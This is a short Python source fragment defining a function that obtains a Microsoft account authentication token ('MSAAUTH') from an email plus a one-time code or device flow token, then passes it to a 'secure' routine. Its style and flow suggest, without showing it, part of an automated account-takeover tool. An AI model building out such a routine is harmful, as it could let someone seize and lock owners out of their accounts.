from views.utils.getMSAAUTH import getMSAAUTH
from views.utils.secure import secure

def startSecuringAccount(email: str, device: str, code: str = None):
    if code:
        msaauth = getMSAAUTH(email, code=code)
    else:
        msaauth = getMSAAUTH(email, flowToken=device)
    
    if msaauth is None:
        return msaauth
    
    print("[+] - Got MSAAUTH | Starting to secure...")
    account = secure(msaauth)

    
    
    